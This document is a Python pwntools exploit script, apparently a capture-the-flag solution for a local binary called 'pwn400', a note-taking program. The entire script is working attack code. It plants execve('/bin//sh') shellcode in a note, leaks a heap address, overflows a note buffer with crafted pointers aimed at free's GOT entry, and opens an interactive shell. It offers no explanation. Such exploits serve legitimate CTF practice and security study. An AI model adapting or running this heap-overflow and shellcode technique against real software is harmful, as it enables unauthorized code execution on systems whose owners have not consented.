from pwn import *

free_got = 0x804a450

shellcode =  "\x90\x90"+"\xeb\x08"+"AAAA"+"\x90"*10+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x59\x50\x5a\xb0\x0b\xcd\x80"

p = process( './pwn400' )

print p.recvuntil('option--->>')

p.sendline( '1' )

p.sendlineafter( 'note title:' , '123' )

p.sendlineafter( 'note type:'  , '123' )

p.sendlineafter('note content:' , '123' )

print p.recvuntil('option--->>')

p.sendline( '1' )

p.sendlineafter( 'note title:' , '456' )

p.sendlineafter( 'note type:'  , '123' )

p.sendlineafter('note content:' , '123' )

print p.recvuntil('option--->>')

p.sendline( '1' )

p.sendlineafter( 'note title:' , '789' )

p.sendlineafter( 'note type:'  , '123' )

p.sendlineafter('note content:' , shellcode)

p.sendlineafter('option--->>' , '3')

p.sendlineafter( 'note title:' , '456' )

print p.recvuntil('location:0x')

note2_addr = int ( p.recv(8) , 16 )

print hex(note2_addr)

p.sendlineafter('option--->>' , '4' )

p.sendlineafter( 'note title:' , '123' )


payload = 'a'*260 + p32( note2_addr ) + p32( free_got - 8 ) + p32( note2_addr + 0x170 + 0x6c )

p.sendlineafter( 'input content:' , payload )

p.sendlineafter( 'option--->>'  , '5')

#p.sendlineafter( 'note location:' , hex( note2_addr)[2:] )

print p.recvuntil ( 'note location:' )

p.sendline( hex(note2_addr ) [2:])


print p.recv(1024)

p.interactive()
